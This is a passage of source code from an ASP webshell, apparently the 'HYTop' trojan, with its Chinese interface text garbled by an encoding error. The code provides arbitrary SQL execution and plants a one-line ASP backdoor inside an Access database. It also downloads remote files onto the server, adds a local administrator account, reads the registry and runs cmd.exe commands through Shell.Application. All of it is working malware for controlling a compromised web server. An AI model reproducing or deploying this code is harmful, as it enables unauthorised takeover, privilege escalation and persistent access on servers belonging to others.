                   echo &quot;&lt;td align=Left>&nbsp;&quot; & rsColumn(&quot;Column_Name&quot;) & &quot;&lt;/td>&quot;
                   echo &quot;&lt;td width=80>&quot; & getDataType(rsColumn(&quot;Data_Type&quot;)) & &quot;&lt;/td>&quot;
                   echo &quot;&lt;td width=70>&quot; & rsColumn(&quot;Character_Maximum_Length&quot;) & &quot;&lt;/td>&quot;
                   echo &quot;&lt;td width=70>&quot; & rsColumn(&quot;Numeric_Precision&quot;) & &quot;&lt;/td>&quot;
                   echo &quot;&lt;td width=70>&quot; & rsColumn(&quot;Is_Nullable&quot;) & &quot;&lt;/td>&quot;
                   echo &quot;&lt;td width=80>&quot; & rsColumn(&quot;Column_Default&quot;) & &quot;&lt;/td>&quot;
                   echo &quot;&lt;/tr>&quot;
                   rsColumn.MoveNext
               Loop

               echo &quot;&lt;tr>&lt;td colspan=6>&lt;hr/>&lt;/td>&lt;/tr>&lt;/table>&quot;
               rsTable.MoveNext
           Loop
           echo &quot;&lt;hr/>&quot;
           conn.Close
           Set conn = Nothing
           Set rsTable = Nothing
           Set rsColumn = Nothing
       End Sub

       Sub showQuery()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
           sql = Request(&quot;sql&quot;)
           page = Request(&quot;page&quot;)
           sqlStr = Request(&quot;sqlStr&quot;)
           theTable = Request(&quot;theTable&quot;)

           If Not IsNumeric(page) or page = &quot;&quot; Then
               page = 1
           End If

           If sql = &quot;&quot; And theTable &lt;> &quot;&quot; Then
               sql = &quot;Select top 10 * from [&quot; & theTable & &quot;]&quot;
           End If

           If LCase(Left(sqlStr, 4)) = &quot;sql:&quot; Then
               connStr = Mid(sqlStr, 5)
            Else
               connStr = &quot;Provider=Microsoft.Jet.Oledb.4.0;Data Source=&quot; & sqlStr
           End If
           Set rs = Server.CreateObject(&quot;Adodb.RecordSet&quot;)
           Set conn = Server.CreateObject(&quot;Adodb.Connection&quot;)

           conn.Open connStr
           chkErr(Err)

           tablesStr = getTableList(conn, sqlStr, rsTable)
           echo &quot;&lt;a href=&quot;&quot;?pageName=MsDataBase&theAct=showTables&sqlStr=&quot; & UrlEncode(sqlStr)  & &quot;&quot;&quot;>Êý¾Ý¿â±í½á¹¹²é¿´:&lt;/a>&lt;br/>&quot;
           echo tablesStr & &quot;&lt;hr/>&quot;
           echo &quot;&lt;a href=?pageName=MsDataBase&theAct=query&sqlStr=&quot; & UrlEncode(sqlStr) & &quot;&sql=&quot; & UrlEncode(sql) & &quot;>SQLÃüÁîÖ´ÐÐ¼°²é¿´&lt;/a>&quot;
           echo &quot;&lt;br/>&lt;form method=post action=&quot;&quot;?pageName=MsDataBase&theAct=query&sqlStr=&quot; & UrlEncode(sqlStr) & &quot;&quot;&quot;>&quot;
           echo &quot;&lt;input name=sql type=text id=sql value=&quot;&quot;&quot; & HtmlEncode(sql) & &quot;&quot;&quot; size=60>&quot;
           echo &quot;&lt;input type=Submit name=Submit4 value=Ö´ÐÐ²éÑ¯>&lt;hr/>&quot;
           If sql &lt;> &quot;&quot; And Left(LCase(sql), 7) = &quot;select &quot; Then
               rs.Open sql, conn, 1, 1
               chkErr(Err)
               rs.PageSize = 20
               If Not rs.Eof Then
                   rs.AbsolutePage = page
               End If
               If rs.Fields.Count>0 Then
                   echo &quot;&lt;br>&lt;table border=&quot;&quot;1&quot;&quot; cellpadding=&quot;&quot;0&quot;&quot; cellspacing=&quot;&quot;0&quot;&quot; width=&quot;&quot;98%&quot;&quot;>&quot;
                   echo &quot;&lt;tr>&quot;
                   echo &quot;&lt;td height=&quot;&quot;22&quot;&quot; align=&quot;&quot;center&quot;&quot; class=&quot;&quot;tr&quot;&quot; colspan=&quot;&quot;&quot; & rs.Fields.Count & &quot;&quot;&quot;>SQL²Ù×÷ - Ö´ÐÐ½á¹û&lt;/td>&quot;
                   echo &quot;&lt;/tr>&quot;
                   echo &quot;&lt;tr>&quot;
                   For j = 0 To rs.Fields.Count-1
                       echo &quot;&lt;td height=&quot;&quot;22&quot;&quot; align=&quot;&quot;center&quot;&quot; class=&quot;&quot;td&quot;&quot;> &quot; & rs.Fields(j).Name & &quot; &lt;/td>&quot;
                   Next
                   For i = 1 To 20
                       If rs.Eof Then
                           Exit For
                       End If
                       echo &quot;&lt;/tr>&quot;
                       echo &quot;&lt;tr valign=top>&quot;
                       For j = 0 To rs.Fields.Count-1
                           echo &quot;&lt;td height=&quot;&quot;22&quot;&quot; align=&quot;&quot;center&quot;&quot;>&quot; & HtmlEncode(fixNull(rs(j))) & &quot;&lt;/td>&quot;
                       Next
                       echo &quot;&lt;/tr>&quot;
                       rs.MoveNext
                   Next
               End If
               echo &quot;&lt;tr>&quot;
               echo &quot;&lt;td height=&quot;&quot;22&quot;&quot; align=&quot;&quot;center&quot;&quot; class=&quot;&quot;td&quot;&quot; colspan=&quot;&quot;&quot; & rs.Fields.Count & &quot;&quot;&quot;>&quot;
               For i = 1 To rs.PageCount
                   echo Replace(&quot;&lt;a href=&quot;&quot;?pageName=MsDataBase&theAct=query&sqlStr=&quot; & UrlEncode(sqlStr) & &quot;&sql=&quot; & UrlEncode(sql) & &quot;&page=&quot; & i & &quot;&quot;&quot;>&lt;font {$font&quot; & i & &quot;}>&quot; & i & &quot;&lt;/font>&lt;/a> &quot;, &quot;{$font&quot; & page & &quot;}&quot;, &quot;class=warningColor&quot;)
               Next
               echo &quot;&lt;/td>&lt;/tr>&lt;/table>&quot;
               rs.Close
            Else
               If sql &lt;> &quot;&quot; Then
                   conn.Execute(sql)
                   chkErr(Err)
                   echo &quot;&lt;center>&lt;br>Ö´ÐÐÍê±Ï!&lt;/center>&quot;
               End If
           End If
           echo &quot;&lt;/form>&lt;hr/>&quot;
           conn.Close
           Set rs = Nothing
           Set conn = Nothing
           Set rsTable = Nothing
       End Sub

       Function getDataType(typeId)
           Select Case typeId
               Case 130
                   getDataType = &quot;ÎÄ±¾&quot;
               Case 2
                   getDataType = &quot;ÕûÐÍ&quot;
               Case 3
                   getDataType = &quot;³¤ÕûÐÍ&quot;
               Case 7
                   getDataType = &quot;ÈÕÆÚ/Ê±¼ä&quot;
               Case 5
                   getDataType = &quot;Ë«¾«¶ÈÐÍ&quot;
               Case 11
                   getDataType = &quot;ÊÇ/·ñ&quot;
               Case 128
                   getDataType = &quot;OLE ¶ÔÏó&quot;
               Case Else
                   getDataType = typeId
           End Select
       End Function

       Sub accessInject()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim rs, conn, sqlStr, connStr
           sqlStr = Request(&quot;sqlStr&quot;)
           If LCase(Left(sqlStr, 4)) = &quot;sql:&quot; Then
               showErr(&quot;²åÈëÖ»¶ÔACCESSÊý¾Ý¿âÓÐÐ§!&quot;)
            Else
               connStr = &quot;Provider=Microsoft.Jet.Oledb.4.0;Data Source=&quot; & sqlStr
           End If
           Set rs = Server.CreateObject(&quot;Adodb.RecordSet&quot;)
           Set conn = Server.CreateObject(&quot;Adodb.Connection&quot;)
           conn.Open connStr
           chkErr(Err)
           If notdownloadsExists = True Then
               conn.Execute(&quot;drop table notdownloads&quot;)
           End If
           conn.Execute(&quot;create table notdownloads(notdownloads oleobject)&quot;)
           rs.Open &quot;notdownloads&quot;, conn, 1, 3
           rs.AddNew
           rs(&quot;notdownloads&quot;).AppendChunk(ChrB(Asc(&quot;&lt;&quot;)) & ChrB(Asc(&quot;%&quot;)) & ChrB(Asc(&quot;e&quot;)) & ChrB(Asc(&quot;x&quot;)) & ChrB(Asc(&quot;e&quot;)) & ChrB(Asc(&quot;c&quot;)) & ChrB(Asc(&quot;u&quot;)) & ChrB(Asc(&quot;t&quot;)) & ChrB(Asc(&quot;e&quot;)) & ChrB(Asc(&quot;(&quot;)) & ChrB(Asc(&quot;r&quot;)) & ChrB(Asc(&quot;e&quot;)) & ChrB(Asc(&quot;q&quot;)) & ChrB(Asc(&quot;u&quot;)) & ChrB(Asc(&quot;e&quot;)) & ChrB(Asc(&quot;s&quot;)) & ChrB(Asc(&quot;t&quot;)) & ChrB(Asc(&quot;(&quot;)) & ChrB(Asc(&quot;&quot;&quot;&quot;)) & ChrB(Asc(clientPassword)) & ChrB(Asc(&quot;&quot;&quot;&quot;)) & ChrB(Asc(&quot;)&quot;)) & ChrB(Asc(&quot;)&quot;)) & ChrB(Asc(&quot;%&quot;)) & ChrB(Asc(&quot;>&quot;)) & ChrB(Asc(&quot; &quot;)))
           rs.Update
           rs.Close

           echo &quot;&lt;script language=&quot;&quot;javascript&quot;&quot;>alert('²åÈë³É¹¦!');history.back();&lt;/script>&quot;

           conn.Close
           Set rs = Nothing
           Set conn = Nothing
       End Sub

       Function getTableList(conn, sqlStr, rsTable)
           Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, &quot;table&quot;))
           Do Until rsTable.Eof
               getTableList = getTableList & &quot;&lt;a href=&quot;&quot;?pageName=MsDataBase&theAct=query&sqlStr=&quot; & UrlEncode(sqlStr) & &quot;&theTable=&quot; & UrlEncode(rsTable(&quot;Table_Name&quot;)) & &quot;&quot;&quot;>[&quot; & rsTable(&quot;Table_Name&quot;) & &quot;]&lt;/a>&nbsp;&quot;
               rsTable.MoveNext
           Loop
           rsTable.MoveFirst
       End Function
       Sub PageObjOnSrv()
           Dim i, objTmp, txtObjInfo, strObjectList, strDscList
           txtObjInfo = Trim(Request(&quot;txtObjInfo&quot;))
           strObjectList = &quot;MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator,&quot; & _
                           &quot;IISSample.PageCounter,MSWC.PermissionChecker,Adodb.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile,&quot; & _
                           &quot;Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,&quot; & _
                           &quot;IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image,&quot; & _
                           &quot;Scripting.FileSystemObject,Adodb.Stream,Shell.Application,WScript.Shell,Wscript.Network&quot;
           strDscList = &quot;¹ã¸æÂÖ»»,ä¯ÀÀÆ÷ÐÅÏ¢,ÄÚÈÝÁ´½Ó¿â,,,¼ÆÊýÆ÷,ÄÚÈÝÂÖÏÔ,,È¨ÏÞ¼ì²â,ADO Êý¾Ý¶ÔÏó,SA-FileUp ÎÄ¼þÉÏ´«,SoftArtisans ÎÄ¼þ¹ÜÀí,&quot; & _
                        &quot;ÁõÔÆ·åµÄÎÄ¼þÉÏ´«×é¼þ,ASPUpload ÎÄ¼þÉÏ´«,Dimac ÎÄ¼þÉÏ´«,Dimac JMail ÓÊ¼þÊÕ·¢,ÐéÄâ SMTP ·¢ÐÅ,ASPemail ·¢ÐÅ,ASPmail ·¢ÐÅ,dkQmail ·¢ÐÅ,&quot; & _
                        &quot;Geocel ·¢ÐÅ,IISmail ·¢ÐÅ,SmtpMail ·¢ÐÅ,SA µÄÍ¼Ïñ¶ÁÐ´,Dimac µÄÍ¼Ïñ¶ÁÐ´×é¼þ,&quot; & _
                        &quot;FSO,Stream Á÷,,,&quot;
           aryObjectList = Split(strObjectList, &quot;,&quot;)
           aryDscList = Split(strDscList, &quot;,&quot;)
           showTitle(&quot;·þÎñÆ÷×é¼þÖ§³ÖÇé¿ö¼ì²â&quot;)
           echo &quot;ÆäËû×é¼þÖ§³ÖÇé¿ö¼ì²â&lt;br/>&quot;
           echo &quot;ÔÚÏÂÃæµÄÊäÈë¿òÖÐÊäÈëÄãÒª¼ì²âµÄ×é¼þµÄProgId»òClassId¡£&lt;br/>&quot;
           echo &quot;&lt;form method=post>&quot;
           echo &quot;&lt;input name=txtObjInfo size=30 value=&quot;&quot;&quot; & txtObjInfo & &quot;&quot;&quot;>&lt;input name=theAct type=submit value=ÎÒÒª¼ì²â>&quot;
           echo &quot;&lt;/form>&quot;
           If Request(&quot;theAct&quot;) = &quot;ÎÒÒª¼ì²â&quot; And txtObjInfo &lt;> &quot;&quot; Then
               Call getObjInfo(txtObjInfo, &quot;&quot;)
           End If

           echo &quot;&lt;hr/>&quot;
           echo &quot;&lt;lu>×é¼þÃû³Æ ©ª Ö§³Ö¼°ÆäËü&quot;
           For i = 0 To UBound(aryDscList)
               Call getObjInfo(aryObjectList(i), aryDscList(i))
           Next
           echo &quot;&lt;/lu>&lt;hr/>Powered By Marcos 2005.02&quot;
       End Sub

       Sub getObjInfo(strObjInfo, strDscInfo)
           Dim objTmp
           If isDebugMode = False Then
               On Error Resume Next
           End If
           echo &quot;&lt;li> &quot; & strObjInfo
           If strDscInfo &lt;> &quot;&quot; Then
               echo &quot; (&quot; & strDscInfo & &quot;×é¼þ)&quot;
           End If
           echo &quot; ©ª &quot;
           Set objTmp = Server.CreateObject(strObjInfo)
           If Err &lt;> -2147221005 Then
               echo &quot;¡Ì &quot;
               echo &quot;Version: &quot; & objTmp.Version & &quot;; &quot;
               echo &quot;About: &quot; & objTmp.About
            Else
               echo &quot;¡Á&quot;
           End If
           echo &quot;&lt;/li>&quot;
           If Err Then
               Err.Clear
           End If

           Set objTmp = Nothing
       End Sub
       Sub PageOtherTools()
           Dim theAct
           theAct = Request(&quot;theAct&quot;)
           showTitle(&quot;Ò»Ð©ÁãËéµÄÐ¡¶«Î÷&quot;)
           Select Case theAct
               Case &quot;downFromUrl&quot;
                   downFromUrl()
                   Response.End
               Case &quot;addUser&quot;
                   AddUser Request(&quot;userName&quot;), Request(&quot;passWord&quot;)
                   Response.End
               Case &quot;readReg&quot;
                   readReg()
                   Response.End
           End Select
           echo &quot;ÊýÖÆ×ª»»:&lt;hr/>&quot;
           echo &quot;&lt;input name=text1 value=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ size=25 id=text9>&quot;
           echo &quot;&lt;input type=button onclick=main(); value=¸øÎÒ×ª>&quot;
           echo &quot;&lt;input value=16½øÖÆ×ª10½øÖÆºÍ×Ö·û size=25 id=vars>&quot;
           echo &quot;&lt;input type=button onClick=main2(); value=¸øÎÒ×ª>&quot;
           echo &quot;&lt;hr/>&quot;

           echo &quot;ÏÂÔØµ½·þÎñÆ÷:&lt;hr/>&quot;
           echo &quot;&lt;form method=post target=_blank>&quot;
           echo &quot;&lt;input name=theUrl value='http://' size=80>&lt;input type=submit value=' ÏÂÔØ '>&lt;br/>&quot;
           echo &quot;&lt;input name=thePath value=&quot;&quot;&quot; & HtmlEncode(Server.MapPath(&quot;.&quot;)) & &quot;&quot;&quot; size=80>&quot;
           echo &quot;&lt;input type=checkbox name=overWrite value=2>´æÔÚ¸²¸Ç&quot;
           echo &quot;&lt;input type=hidden value=downFromUrl name=theAct>&quot;
           echo &quot;&lt;/form>&quot;
           echo &quot;&lt;hr/>&quot;

           echo &quot;ÎÄ¼þ±à¼:&lt;hr/>&quot;
           echo &quot;&lt;form method=post action='?' target=_blank>&quot;
           echo &quot;&lt;input size=80 name=thePath value=&quot;&quot;&quot; & HtmlEncode(Request.ServerVariables(&quot;PATH_TRANSLATED&quot;)) & &quot;&quot;&quot;>&quot;
           echo &quot;&lt;input type=hidden value=showEdit name=theAct>&quot;
           echo &quot;&lt;select name=pageName>&lt;option value=AppFileExplorer>ÓÃStream&lt;/option>&lt;option value=FsoFileExplorer>ÓÃFSO&lt;/option>&lt;/select>&quot;
           echo &quot;&lt;input type=submit value=' ´ò¿ª '>&quot;
           echo &quot;&lt;/form>&lt;hr/>&quot;

           echo &quot;¹ÜÀíÕÊºÅÌí¼Ó(³É¹¦ÂÊ¼«µÍ):&lt;hr/>&quot;
           echo &quot;&lt;form method=post target=_blank>&quot;
           echo &quot;&lt;input type=hidden value=addUser name=theAct>&quot;
           echo &quot;&lt;input name=userName value='HYTop' size=39>&quot;
           echo &quot;&lt;input name=passWord type=password value='HYTop' size=39>&quot;
           echo &quot;&lt;input type=submit value=' Ìí¼Ó '>&quot;
           echo &quot;&lt;/form>&lt;hr/>&quot;

           echo &quot;×¢²á±í¼üÖµ¶ÁÈ¡(&lt;a href=javascript:showHideMe(regeditInfo);>×ÊÁÏ&lt;/a>):&lt;hr/>&quot;
           echo &quot;&lt;form method=post target=_blank>&quot;
           echo &quot;&lt;input type=hidden value=readReg name=theAct>&quot;
           echo &quot;&lt;input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>&quot;
           echo &quot;&lt;input type=submit value=' ¶ÁÈ¡ '>&quot;
           echo &quot;&lt;span id=regeditInfo style='display:none;'>&lt;hr/>&quot;
           echo &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {²»ÏÔÊ¾ÉÏ´ÎµÇÂ¼ÓÃ»§}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=È±Ê¡,1=ÄäÃûÓÃ»§ÎÞ·¨ÁÐ¾Ù±¾»úÓÃ»§ÁÐ±í,2=ÄäÃûÓÃ»§ÎÞ·¨Á¬½Ó±¾»úIPC$¹²Ïí}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {½ûÖ¹Ä¬ÈÏ¹²Ïí}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {¹Ø±ÕÍøÂç¹²Ïí}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {ÆôÓÃTCP/IPÉ¸Ñ¡(ËùÓÐÊÔÅäÆ÷)}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {ÔÊÐíIPÂ·ÓÉ}&lt;br/>&quot;
           echo &quot;-------ÒÔÏÂËÆºõÒª¿´°ó¶¨µÄÍø¿¨,²»ÖªµÀÊÇ·ñ×¼È·---------&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ä¬ÈÏÍø¹Ø}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {Ê×DNS}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {ÔÊÐíµÄTCP/IP¶Ë¿Ú}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {ÔÊÐíµÄUDP¶Ë¿Ú}&lt;br/>&quot;
           echo &quot;-----------OVER--------------------&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {¹²¼¸¿é»î¶¯Íø¿¨}&lt;br/>&quot;
           echo &quot;HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {µ±Ç°Íø¿¨µÄÐòÁÐ(°ÑÉÏÃæµÄÌæ»»)}&lt;br/>&quot;
           echo &quot;==========================================================&lt;br/>ÒÔÉÏ×ÊÁÏÓÉkEvin1986Ìá¹©&quot;
           echo &quot;&lt;/span>&quot;
           echo &quot;&lt;/form>&lt;hr/>&quot;

           echo &quot;&lt;script language=vbs>&quot; & vbNewLine
           echo &quot;sub main()&quot; & vbNewLine
           echo &quot;base=document.all.text9.value&quot; & vbNewLine
           echo &quot;If IsNumeric(base) Then&quot; & vbNewLine
           echo &quot;cc=hex(cstr(base))&quot; & vbNewLine
           echo &quot;alert(&quot;&quot;10½øÖÆÎª&quot;&quot;&base)&quot; & vbNewLine
           echo &quot;alert(&quot;&quot;16½øÖÆÎª&quot;&quot;&cc)&quot; & vbNewLine
           echo &quot;exit sub&quot; & vbNewLine
           echo &quot;end if&quot; & vbNewLine
           echo &quot;aa=asc(cstr(base))&quot; & vbNewLine
           echo &quot;bb=hex(aa)&quot; & vbNewLine
           echo &quot;alert(&quot;&quot;10½øÖÆÎª&quot;&quot;&aa)&quot; & vbNewLine
           echo &quot;alert(&quot;&quot;16½øÖÆÎª&quot;&quot;&bb)&quot; & vbNewLine
           echo &quot;end sub&quot; & vbNewLine
           echo &quot;sub main2()&quot; & vbNewLine
           echo &quot;If document.all.vars.value&lt;>&quot;&quot;&quot;&quot; Then&quot; & vbNewLine
           echo &quot;Dim nums,tmp,tmpstr,i&quot; & vbNewLine
           echo &quot;nums=document.all.vars.value&quot; & vbNewLine
           echo &quot;nums_len=Len(nums)&quot; & vbNewLine
           echo &quot;For i=1 To nums_len&quot; & vbNewLine
           echo &quot;tmp=Mid(nums,i,1)&quot; & vbNewLine
           echo &quot;If IsNumeric(tmp) Then&quot; & vbNewLine
           echo &quot;tmp=tmp * 16 * (16^(nums_len-i-1))&quot; & vbNewLine
           echo &quot;Else&quot; & vbNewLine
           echo &quot;If ASC(UCase(tmp))&lt;65 Or ASC(UCase(tmp))>70 Then&quot; & vbNewLine
           echo &quot;alert(&quot;&quot;ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«fÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£&quot;&quot;)&quot; & vbNewLine
           echo &quot;exit sub&quot; & vbNewLine
           echo &quot;End If&quot; & vbNewLine
           echo &quot;tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))&quot; & vbNewLine
           echo &quot;End If&quot; & vbNewLine
           echo &quot;tmpstr=tmpstr+tmp&quot; & vbNewLine
           echo &quot;Next&quot; & vbNewLine
           echo &quot;alert(&quot;&quot;×ª»»µÄ10½øÖÆÎª:&quot;&quot;&tmpstr&&quot;&quot;Æä×Ö·ûÖµÎª:&quot;&quot;&chr(tmpstr))&quot; & vbNewLine
           echo &quot;End If&quot; & vbNewLine
           echo &quot;end sub&quot; & vbNewLine
           echo &quot;&lt;/script>&quot; & vbNewLine
           echo &quot;Powered By Marcos 2005.02&quot;
       End Sub

       Sub downFromUrl()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim Http, theUrl, thePath, stream, fileName, overWrite
           theUrl = Request(&quot;theUrl&quot;)
           thePath = Request(&quot;thePath&quot;)
           overWrite = Request(&quot;overWrite&quot;)
           Set stream = Server.CreateObject(&quot;Adodb.Stream&quot;)
           Set Http = Server.CreateObject(&quot;MSXML2.XMLHTTP&quot;)

           If overWrite &lt;> 2 Then
               overWrite = 1
           End If

           Http.Open &quot;GET&quot;, theUrl, False
           Http.Send()
           If Http.ReadyState &lt;> 4 Then
               Exit Sub
           End If

           With stream
               .Type = 1
               .Mode = 3
               .Open
               .Write Http.ResponseBody
               .Position = 0
               .SaveToFile thePath, overWrite
               If Err.Number = 3004 Then
                   Err.Clear
                   fileName = Split(theUrl, &quot;/&quot;)(UBound(Split(theUrl, &quot;/&quot;)))
                   If fileName = &quot;&quot; Then
                       fileName = &quot;index.htm.txt&quot;
                   End If
                   thePath = thePath & &quot;\&quot; & fileName
                   .SaveToFile thePath, overWrite
               End If
               .Close
           End With
           chkErr(Err)

           alertThenClose(&quot;ÎÄ¼þ &quot; & Replace(thePath, &quot;\&quot;, &quot;\\&quot;) & &quot; ÏÂÔØ³É¹¦!&quot;)

           Set Http = Nothing
           Set Stream = Nothing
       End Sub

       Sub AddUser(strUser, strPassword)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim computer, theUser, theGroup
           Set computer = Getobject(&quot;WinNT://.&quot;)
           Set theGroup = GetObject(&quot;WinNT://./Administrators,group&quot;)

           Set theUser = computer.Create(&quot;User&quot;, strUser)
           theUser.SetPassword(strPassword)
           chkErr(Err)
           theUser.SetInfo
           chkErr(Err)
           theGroup.Add theUser
           chkErr(Err)

           Set theUser = Nothing
           Set computer = Nothing
           Set theGroup = Nothing

           echo getUserInfo(strUser)
       End Sub

       Sub readReg()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, thePath, theArray
           thePath = Request(&quot;thePath&quot;)
   '       echo thePath & &quot;&lt;br/>&quot;
           theArray = ws.RegRead(thePath)
           If IsArray(theArray) Then
               For i = 0 To UBound(theArray)
                   echo &quot;&lt;li>&quot; & theArray(i)
               Next
            Else
               echo &quot;&lt;li>&quot; & theArray
           End If
           chkErr(Err)
       End Sub
       Sub PageList()
           showTitle(&quot;¹¦ÄÜÄ£¿éÁÐ±í&quot;)
           echo &quot;&lt;base target=_blank>&quot;
           echo &quot;º£Ñô¶¥¶ËÍøASPÄ¾Âí@2006¦Á&lt;hr/>&quot;
           echo &quot;&lt;ol>&lt;li>&lt;a href='?pageName=ServiceList'>ÏµÍ³·þÎñÐÅÏ¢&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=infoAboutSrv'>·þÎñÆ÷Ïà¹ØÊý¾Ý&lt;br/>(&quot;
           echo &quot;&lt;a href='?pageName=infoAboutSrv&theAct=getSrvInfo'>ÏµÍ³²ÎÊý&lt;/a>,&quot;
           echo &quot;&lt;a href='?pageName=infoAboutSrv&theAct=getSrvDrvInfo'>ÏµÍ³´ÅÅÌ&lt;/a>,&quot;
           echo &quot;&lt;a href='?pageName=infoAboutSrv&theAct=getSiteRootInfo'>Õ¾µãÎÄ¼þ¼Ð&lt;/a>,&quot;
           echo &quot;&lt;a href='?pageName=infoAboutSrv&theAct=getTerminalInfo'>ÖÕ¶Ë¶Ë¿Ú&×Ô¶¯µÇÂ¼)&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=objOnSrv'>·þÎñÆ÷×é¼þÌ½Õë&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=userList'>ÏµÍ³ÓÃ»§¼°ÓÃ»§×éÐÅÏ¢&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=CSInfo'>¿Í»§¶Ë·þÎñÆ÷½»»¥ÐÅÏ¢&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=WsCmdRun'>WScript.Shell³ÌÐòÔËÐÐÆ÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=SaCmdRun'>Shell.Application³ÌÐòÔËÐÐÆ÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=FsoFileExplorer'>FSOÎÄ¼þä¯ÀÀ²Ù×÷Æ÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=AppFileExplorer'>Shell.ApplicationÎÄ¼þä¯ÀÀ²Ù×÷Æ÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=MsDataBase'>Î¢ÈíÊý¾Ý¿â²é¿´/²Ù×÷Æ÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=TxtSearcher'>ÎÄ±¾ÎÄ¼þËÑË÷Æ÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;li>&lt;a href='?pageName=OtherTools'>Ò»Ð©ÁãËéµÄÐ¡¶«Î÷&lt;/a>&lt;/li>&quot;
           echo &quot;&lt;br/>&lt;/ol>&quot;
           echo &quot;&lt;hr/>Powered By Marcos 2005.02&quot;
       End Sub
       Sub PageSaCmdRun()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim theFile, thePath, theAct, appPath, appName, appArgs

           showTitle(&quot;Shell.ApplicationÃüÁîÐÐ²Ù×÷&quot;)

           theAct = Trim(Request(&quot;theAct&quot;))
           appPath = Trim(Request(&quot;appPath&quot;))
           thePath = Trim(Request(&quot;thePath&quot;))
           appName = Trim(Request(&quot;appName&quot;))
           appArgs = Trim(Request(&quot;appArgs&quot;))
           If theAct = &quot;doAct&quot; Then
               If appName = &quot;&quot; Then
                   appName = &quot;cmd.exe&quot;
               End If

               If appPath &lt;> &quot;&quot; And Right(appPath, 1) &lt;> &quot;\&quot; Then
                   appPath = appPath & &quot;\&quot;
               End If

               If LCase(appName) = &quot;cmd.exe&quot; And appArgs &lt;> &quot;&quot; Then
                   If LCase(Left(appArgs, 2)) &lt;> &quot;/c&quot; Then
                       appArgs = &quot;/c &quot; & appArgs
                   End If
               Else
                   If LCase(appName) = &quot;cmd.exe&quot; And appArgs = &quot;&quot; Then
                       appArgs = &quot;/c &quot;
                   End If
               End If

               sa.ShellExecute appName, appArgs, appPath, &quot;&quot;, 0
               chkErr(Err)
           End If

           If theAct = &quot;readResult&quot; Then
               Err.Clear
               echo encode(streamLoadFromFile(aspPath))
               If Err Then
                   Set theFile = fso.OpenTextFile(aspPath)
                   echo encode(theFile.ReadAll())
                   Set theFile = Nothing
               End If
               Response.End
